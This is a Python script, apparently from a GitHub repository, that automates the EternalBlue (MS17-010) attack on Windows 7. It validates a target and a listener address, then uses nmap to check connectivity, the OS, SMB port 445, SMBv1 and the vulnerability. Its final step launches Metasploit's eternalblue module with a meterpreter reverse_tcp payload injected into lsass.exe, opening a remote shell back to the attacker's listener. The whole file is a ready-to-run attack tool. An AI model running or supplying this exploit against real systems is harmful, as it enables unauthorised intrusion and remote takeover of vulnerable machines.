#!/usr/bin/env python3
#
#------------------------------------------ Script Description --------------------------------------------------
#
# Name...: exploit_win7_ms17-010.py
# Purpose: A Python script to automate the exploitation of EternalBlue (MS17-010) on Windows 7 operating systems.
# Author.: Rofi (Fixploit03)
# GitHub.: https://github.com/fixploit03/MS17-010
#
#----------------------------------------------------------------------------------------------------------------

import os
import sys
import subprocess
import re
import time
import shutil
from colorama import init, Fore, Style

init()

m = Fore.RED
h = Fore.GREEN
k = Fore.YELLOW
b = Fore.BLUE
p = Fore.WHITE
r = Style.RESET_ALL

ib = Fore.BLUE
ip = Fore.WHITE
ir = Style.RESET_ALL

def check_root():
    try:
        if os.geteuid() != 0:
            print(f"{p}[{m}-{p}] This script must be run as root.{r}")
            sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error checking root privileges: {str(e)}{r}")
        sys.exit(1)

def check_tools():
    required_tools = ["nmap", "msfconsole"]
    not_installed = []

    try:
        for tool in required_tools:
            if shutil.which(tool) is None:
                not_installed.append(tool)

        if not_installed:
            print(f"{p}[{m}-{p}] The script cannot proceed because some required tools are not installed.{r}")
            print("")
            print(f"{p}Tools not installed:{r}")
            print("")
            for missing_tool in not_installed:
                print(f"{p}- {missing_tool}{r}")
            sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error checking tools: {str(e)}{r}")
        sys.exit(1)

def show_banner():
    print(f"{r}")
    print(f"{b}███{p}╗   {b}███{p}╗{b}███████{p}╗{b} ██{p}╗{b}███████{p}╗       {b}██████{p}╗  {b}██{p}╗ {b}██████{p}╗{r}")
    print(f"{b}████{p}╗ {b}████{p}║{b}██{p}╔════╝{b}███{p}║╚════{b}██{p}║      {b}██{p}╔═{b}████{p}╗{b}███{p}║{b}██{p}╔═{b}████{p}╗{r}")
    print(f"{b}██{p}╔{b}████{p}╔{b}██{p}║{b}███████{p}╗╚{b}██{p}║    {b}██{p}╔╝{b}█████{p}╗{b}██{p}║{b}██{p}╔{b}██{p}║╚{b}██{p}║{b}██{p}║{b}██{p}╔{b}██{p}║{r}")
    print(f"{b}██{p}║╚{b}██{p}╔╝{b}██{p}║╚════{b}██{p}║{b} ██{p}║   {b}██{p}╔╝ ╚════╝{b}████{p}╔╝{b}██{p}║ {b}██{p}║{b}████{p}╔╝{b}██{p}║{r}")
    print(f"{b}██{p}║ ╚═╝ {b}██{p}║{b}███████{p}║{b} ██{p}║  {b} ██{p}║        ╚{b}██████{p}╔╝ {b}██{p}║╚{b}██████{p}╔╝{r}")
    print(f"{p}╚═╝     ╚═╝╚══════╝ ╚═╝   ╚═╝         ╚═════╝  ╚═╝ ╚═════╝{r}")
    print(f"{p}-----------------------------------------------------------{r}")
    print(f"{p}[ {b}Automated Eternal Blue {p}({b}MS17-010{p}) {b}Exploit for Windows 7 {p}]{r}")
    print(f"{p}[ Created by: {h}Rofi {p}({h}Fixploit03{p})                           ]{r}")
    print(f"{p}[ Github: {h}https://github.com/fixploit03/MS17-010          {p}]{r}")
    print(f"{p}-----------------------------------------------------------{r}")
    print(f"{r}")

def input_ip_address():
    while True:
        try:
            ip_address = input(f"{ip}[{ib}MS17-010{ip}] Enter target IP address: {ir}")
            if not ip_address:
                print(f"{p}[{m}-{p}] Target IP address cannot be empty.{r}")
                continue
            if not re.match(r"^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$", ip_address):
                print(f"{p}[{m}-{p}] Invalid target IP address format.{r}")
                continue
            octets = ip_address.split(".")
            if all(0 <= int(octet) <= 255 for octet in octets):
                print(f"{p}[{h}+{p}] Target IP address set to -> {h}{ip_address}{r}")
                return ip_address
            else:
                print(f"{p}[{m}-{p}] IP address octets must be between 0 and 255.{r}")
        except Exception as e:
            print(f"{p}[{m}-{p}] Error processing IP address input: {str(e)}{r}")

def set_listener():
    while True:
        try:
            ip_listener = input(f"{ip}[{ib}MS17-010{ip}] Enter listener IP address: {ir}")
            if not ip_listener:
                print(f"{p}[{m}-{p}] Listener IP address cannot be empty.{r}")
                continue
            if not re.match(r"^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$", ip_listener):
                print(f"{p}[{m}-{p}] Invalid listener IP address format.{r}")
                continue
            octets = ip_listener.split(".")
            if all(0 <= int(octet) <= 255 for octet in octets):
                print(f"{p}[{h}+{p}] Listener IP address set to -> {h}{ip_listener}{r}")
                break
            else:
                print(f"{p}[{m}-{p}] IP address octets must be between 0 and 255.{r}")
        except Exception as e:
            print(f"{p}[{m}-{p}] Error processing listener IP input: {str(e)}{r}")

    while True:
        try:
            port_listener = input(f"{ip}[{ib}MS17-010{ip}] Enter listener port (default 4444): {ir}")
            if not port_listener:
                port = "4444"
                print(f"{p}[{h}+{p}] Listener port set to -> {h}{port}{r}")
                return ip_listener, port
            if not port_listener.isdigit() or not (1 <= int(port_listener) <= 65535):
                print(f"{p}[{m}-{p}] Invalid port number. Must be between 1 and 65535.{r}")
                continue
            port = port_listener
            print(f"{p}[{h}+{p}] Listener port set to -> {h}{port}{r}")
            return ip_listener, port
        except Exception as e:
            print(f"{p}[{m}-{p}] Error processing port input: {str(e)}{r}")

def check_connectivity(ip_address):
    print(f"{p}[{b}*{p}] Checking connectivity to target...{r}")
    try:
        result = subprocess.run(["ping", "-c", "4", ip_address], capture_output=True, text=True, timeout=10)
        if "0% packet loss" in result.stdout.lower():
            print(f"{p}[{h}+{p}] Target is reachable.{r}")
        else:
            print(f"{p}[{m}-{p}] Target is unreachable.{r}")
            print(f"{p}[{m}-{p}] Exploitation canceled.{r}")
            sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] Ping timed out. Target may be unreachable.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error checking connectivity: {str(e)}{r}")
        sys.exit(1)

def check_os(ip_address):
    print(f"{p}[{b}*{p}] Detecting target operating system...{r}")
    try:
        result = subprocess.run(["nmap", "-p", "445", "--script", "smb-os-discovery", "-Pn", "-T4", ip_address], 
                                capture_output=True, text=True, timeout=30)
        if "windows 7" in result.stdout.lower():
            print(f"{p}[{h}+{p}] Target operating system: {h}Windows 7{r}")
        else:
            print(f"{p}[{m}-{p}] Target operating system is not Windows 7.{r}")
            print(f"{p}[{m}-{p}] Exploitation canceled.{r}")
            sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] OS detection timed out.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error detecting OS: {str(e)}{r}")
        sys.exit(1)

def scan_smb_port(ip_address):
    print(f"{p}[{b}*{p}] Checking target SMB port...{r}")
    try:
        result = subprocess.run(["nmap", "-p", "445", "-Pn", "-T4", ip_address], 
                                capture_output=True, text=True, timeout=20)
        if "open" in result.stdout.lower():
            print(f"{p}[{h}+{p}] SMB port (445) on target is open.{r}")
        else:
            print(f"{p}[{m}-{p}] SMB port (445) on target is closed.{r}")
            print(f"{p}[{m}-{p}] Exploitation canceled.{r}")
            sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] SMB port scan timed out.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error scanning SMB port: {str(e)}{r}")
        sys.exit(1)

def scan_smb_version(ip_address):
    print(f"{p}[{b}*{p}] Checking target SMB version...{r}")
    time.sleep(3)
    try:
        result = subprocess.run(["nmap", "-p", "445", "--script", "smb-protocols", "-Pn", "-T4", ip_address], 
                                capture_output=True, text=True, timeout=20)
        if "smbv1" in result.stdout.lower():
            print(f"{p}[{h}+{p}] SMBv1 is active on target.{r}")
        else:
            print(f"{p}[{m}-{p}] SMBv1 is not active on target.{r}")
            print(f"{p}[{m}-{p}] Exploitation canceled.{r}")
            sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] SMB version scan timed out.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error scanning SMB version: {str(e)}{r}")
        sys.exit(1)

def check_eternalblue_vuln(ip_address):
    print(f"{p}[{b}*{p}] Checking target for Eternal Blue (MS17-010) vulnerability...{r}")
    try:
        result = subprocess.run(["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", "-Pn", "-T4", "-O", ip_address], 
                                capture_output=True, text=True, timeout=30)
        if "vulnerable" in result.stdout.lower():
            print(f"{p}[{h}+{p}] Target is vulnerable to Eternal Blue (MS17-010).{r}")
        else:
            print(f"{p}[{m}-{p}] Target is not vulnerable to Eternal Blue (MS17-010).{r}")
            print(f"{p}[{m}-{p}] Exploitation canceled.{r}")
            sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] Vulnerability scan timed out.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error checking vulnerability: {str(e)}{r}")
        sys.exit(1)

def exploit_smb(ip_address, ip_listener, port_listener):
    port_smb = "445"
    module = "exploit/windows/smb/ms17_010_eternalblue"
    payload = "windows/x64/meterpreter/reverse_tcp"
    process_name = "lsass.exe"

    print(f"{p}[{b}*{p}] Starting Eternal Blue (MS17-010) exploitation...{r}")
    msf_command = (
        f"use {module}; set rhosts {ip_address}; set rport {port_smb}; "
        f"set payload {payload}; set verify_arch true; set verify_target true; "
        f"set processname {process_name}; set lhost {ip_listener}; set lport {port_listener}; "
        f"set exitfunc thread; set verbose true; exploit"
    )
    try:
        subprocess.run(["msfconsole", "-q", "-x", msf_command], timeout=300)
    except subprocess.TimeoutExpired:
        print(f"{p}[{m}-{p}] Exploitation timed out after 5 minutes.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Error during exploitation: {str(e)}{r}")
        sys.exit(1)

def main():
    try:
        check_root()
        check_tools()
        show_banner()
        ip_address = input_ip_address()
        ip_listener, port_listener = set_listener()
        check_connectivity(ip_address)
        check_os(ip_address)
        scan_smb_port(ip_address)
        scan_smb_version(ip_address)
        check_eternalblue_vuln(ip_address)
        exploit_smb(ip_address, ip_listener, port_listener)
    except KeyboardInterrupt:
        print(f"\n{p}[{m}-{p}] Script interrupted by user.{r}")
        sys.exit(1)
    except Exception as e:
        print(f"{p}[{m}-{p}] Unexpected error in main execution: {str(e)}{r}")
        sys.exit(1)

if __name__ == "__main__":
    main()
